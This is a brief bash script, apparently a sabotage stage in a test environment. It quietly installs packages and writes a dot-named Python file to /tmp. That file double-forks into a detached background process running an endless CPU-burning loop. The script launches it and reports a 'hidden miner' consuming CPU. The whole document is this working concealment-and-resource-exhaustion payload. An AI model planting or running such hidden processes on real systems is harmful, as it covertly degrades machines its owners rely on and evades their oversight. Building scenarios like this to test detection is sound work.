#!/bin/bash
set -e

apt-get update -qq >/dev/null 2>&1 || true
apt-get install -y -qq procps python3 >/dev/null 2>&1 || true

cat << 'PYEOF' > /tmp/.hidden_miner.py
import os, sys, time

# Double fork
if os.fork() > 0:
    sys.exit(0)
os.setsid()
if os.fork() > 0:
    sys.exit(0)

# CPU consumption loop (burns CPU cycles)
while True:
    x = 0
    for i in range(1000000):
        x += i * i
    time.sleep(0.001)
PYEOF

chmod +x /tmp/.hidden_miner.py
python3 /tmp/.hidden_miner.py

echo "Stage 203 Sabotage completed. Hidden miner is consuming CPU in background."
